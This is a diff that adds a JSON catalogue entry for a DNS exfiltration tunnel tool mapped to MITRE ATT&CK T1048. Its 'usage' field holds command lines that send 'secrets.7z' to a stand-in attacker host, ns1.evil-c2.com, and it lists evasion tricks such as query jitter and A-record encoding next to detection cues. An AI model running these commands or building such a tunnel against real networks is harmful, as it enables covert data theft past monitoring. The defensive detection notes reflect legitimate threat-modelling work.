@@ -1,0 +1,55 @@
+{
+  "technique_id": "T1048",
+  "technique_name": "Exfiltration Over Alternative Protocol",
+  "tactic": "TA0010 - Exfiltration",
+  "subtechnique_of": null,
+  "description": "Covert DNS exfiltration tunnel that leverages standard UDP/53 DNS query resolution to exfiltrate collected binary blobs out of restricted networks by encoding payload chunks into authoritative FQDN requests.",
+  "platforms": ["Linux", "Windows", "macOS"],
+  "permissions_required": ["User"],
+  "data_sources": ["Network Traffic", "DNS Queries", "Process Creation"],
+  "implementation_details": {
+    "source_file": "sigv5_t1048_dns_exfil_tunnel.py",
+    "language": "Python 3.8+",
+    "dependencies": ["socket (stdlib)", "struct (stdlib)", "base64 (stdlib)"],
+    "external_dependencies": [],
+    "usage": {
+      "standard": "python3 sigv5_t1048_dns_exfil_tunnel.py --file secrets.7z --domain ns1.evil-c2.com",
+      "custom_resolver": "python3 sigv5_t1048_dns_exfil_tunnel.py --file secrets.7z --domain ns1.evil-c2.com --server 8.8.8.8 --delay 1.5"
+    },
+    "capabilities": [
+      "Custom DNS packet builder for stealthy 'A' record queries without external DNS libraries",
+      "Dynamic payload fragmentation respecting the 63-character RFC limit per label",
+      "Base32 (RFC-compliant label safe) and Hexadecimal encoding support",
+      "Automatic session ID generation for parallel exfiltration multiplexing",
+      "INIT, Chunked-Stream, and EOF signaling control channels",
+      "Jitter implementation on query delays to evade volume-based anomaly detection",
+      "Fallback to OS-native local stub resolvers if direct UDP outbound is blocked"
+    ],
+    "evasion_techniques": [
+      "Uses standard OS DNS resolver by default to blend with regular application traffic",
+      "Base32 encoding avoids suspicious characters in the Doman Name field",
+      "Timing jitter prevents simple frequency analysis detections",
+      "Queries 'A' records instead of noisy 'TXT' or 'NULL' records usually used by tunnels"
+    ]
+  },
+  "output_files": [],
+  "mitre_attack_url": "https://attack.mitre.org/techniques/T1048/",
+  "related_techniques": [
+    "T1572 - Protocol Tunneling",
+    "T1071 - Application Layer Protocol"
+  ],
+  "detection_opportunities": [
+    "High volume of DNS requests to a single authoritative domain",
+    "Abnormally long, randomly-generated subdomains (high entropy in DNS query names)",
+    "Significant spike in TXT or A record queries from a single host that never receive answers",
+    "DNS requests originating from unusual or non-browser processes"
+  ],
+  "metadata": {
+    "author": "C4ISR STRATCOM",
+    "version": "1.0",
+    "created": "2026",
+    "classification": "CONFIDENTIAL",
+    "operation": "SIGINT-V5",
+    "convention": "CONV-0221-JAL-HCG-2026"
+  }
+}
